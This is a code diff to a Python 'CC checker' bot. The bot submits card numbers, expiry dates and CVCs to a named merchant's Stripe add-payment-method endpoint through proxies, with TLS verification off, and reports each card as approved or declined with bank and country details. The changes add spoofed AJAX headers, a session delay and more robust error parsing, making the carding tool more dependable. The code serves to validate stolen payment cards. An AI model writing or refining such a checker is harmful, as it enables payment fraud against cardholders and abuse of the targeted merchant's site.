@@ -631,6 +631,9 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
+            # Small delay to ensure session is fully established
+            time.sleep(0.5)
+            
             ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
             if not ajax_nonce:
                 elapsed_time = time.time() - start_time
@@ -716,6 +719,7 @@ DECLINED CC ❌
                 'authority': 'iconichairproducts.com',
                 'accept': '*/*',
                 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'content-type': 'application/x-www-form-urlencoded',
                 'origin': 'https://iconichairproducts.com',
                 'referer': 'https://iconichairproducts.com/my-account/add-payment-method/',
                 'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
@@ -725,6 +729,7 @@ DECLINED CC ❌
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+                'x-requested-with': 'XMLHttpRequest',
             }
 
             form_data = {
@@ -739,16 +744,18 @@ DECLINED CC ❌
                 data=form_data,
                 timeout=30,
                 verify=False,
-                proxies=proxies
+                proxies=proxies,
+                allow_redirects=True
             )
             
-            if response2.status_code != 200:
+            # Check if we got a valid response (even if status is not 200)
+            if not response2.text or len(response2.text.strip()) == 0:
                 elapsed_time = time.time() - start_time
                 return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ AJAX request failed
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ AJAX request failed - Empty response (Status: {response2.status_code})
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
@@ -760,7 +767,27 @@ DECLINED CC ❌
 """
             
             try:
-                pix = response2.json()
+                # Try to parse as JSON
+                if response2.text.strip().startswith('{') or response2.text.strip().startswith('['):
+                    pix = response2.json()
+                else:
+                    # If not JSON, try to extract error message from HTML/text
+                    error_text = response2.text[:200] if len(response2.text) > 200 else response2.text
+                    elapsed_time = time.time() - start_time
+                    return f"""
+DECLINED CC ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ AJAX response not JSON (Status: {response2.status_code})
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
                 
                 if pix.get('success'):
                     elapsed_time = time.time() - start_time
@@ -780,7 +807,10 @@ APPROVED CC ✅
 """
                 else:
                     error_msg = pix.get('data', {}).get('error', {}).get('message', 'Unknown error')
-                    category, emoji = categorize_response(error_msg)
+                    if not error_msg or error_msg == 'Unknown error':
+                        # Try to get error from different locations
+                        error_msg = pix.get('data', {}).get('message', pix.get('message', 'Unknown error'))
+                    category, emoji = categorize_response(str(error_msg))
                     elapsed_time = time.time() - start_time
                     
                     # Check if it's a CCN/CVV case
@@ -830,13 +860,15 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
                     
-            except json.JSONDecodeError:
+            except json.JSONDecodeError as e:
                 elapsed_time = time.time() - start_time
+                # Try to extract any error message from the response
+                response_preview = response2.text[:100] if response2.text else "No response text"
                 return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid response
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid JSON response (Status: {response2.status_code}) - {response_preview}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
